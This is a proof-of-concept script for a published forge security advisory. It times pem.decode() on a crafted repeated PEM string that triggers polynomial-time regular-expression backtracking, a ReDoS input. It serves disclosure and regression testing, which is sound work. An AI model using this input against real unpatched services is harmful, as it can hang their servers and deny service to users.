#!/usr/bin/env node
'use strict';

// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-7wch-p9px-956x
//
// Reported by Ahmed Mokhtari (@AhmedMokhtari), @mwlik, and @imenyoo2.
//
// pem.decode() used a regular expression that takes polynomial time on
// input without a matching END line. Before the fix, this input blocked for
// many seconds, growing roughly with the cube of its length. Inputs from the
// duplicate reports are in the unit tests.

const forge = require('../../lib/index');

const pemString = ' -----BEGIN I-----G-----END B'.repeat(800) + '\x00';

console.time('ReDoS');
try {
  // const pemObjects = forge.pki.privateKeyFromPem(pemString);
  const pemObjects = forge.pem.decode(pemString);
  console.log(pemObjects);
} catch(err) {
  console.error('PEM decode error:', err.message);
}
console.timeEnd('ReDoS');
